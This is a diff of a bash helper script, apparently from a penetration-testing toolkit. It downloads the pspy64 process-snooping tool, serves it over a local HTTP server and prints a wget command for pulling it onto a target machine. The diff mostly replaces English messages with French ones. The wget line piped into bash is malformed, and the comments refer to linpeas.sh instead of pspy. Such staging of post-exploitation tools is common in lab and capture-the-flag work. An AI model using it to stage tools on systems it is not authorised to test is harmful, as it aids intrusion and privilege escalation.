@@ -43,12 +43,11 @@ ip_address=$(ip -o -4 addr show dev $interface | awk '{split($4,a,"/");print a[1
 wget_command="wget http://$ip_address/pspy64 | bash pspy64"
 
 # Download the latest version of linpeas.sh, replacing the existing file / Télécharger la dernière version de linpeas.sh en remplaçant le fichier existant
-echo -e "\e[34mDownloading the latest version of pspy, replacing the existing file\e[0m"
 echo -e "\e[34mTéléchargement de la dernière version de pspy en remplaçant le fichier existant...\e[0m"
 curl -Lf https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o pspy64
 
 # Display the wget command with the IP address of the specified interface in red / Afficher la commande wget avec l'adresse IP de l'interface spécifiée en rouge
-printf "\nCopy this line : \e[31m\e[7m\e[5m\e[1m%*swget http://%s:80/pspy64\e[0m\n" $(((${#ip_address} + 12) / 2)) "" "$ip_address"
+printf "\nCopier cette ligne : \e[31m\e[7m\e[5m\e[1m%*swget http://%s:80/pspy64\e[0m\n" $(((${#ip_address} + 12) / 2)) "" "$ip_address"
 echo -e "\n"
 # Launch a local HTTP server to serve linpeas.sh / Lancer un serveur HTTP local pour servir linpeas.sh
 printf "\e[32m\e[1mHTTP server launched on http://%s:80\n ( CTRL+C for STOP )" "$ip_address"
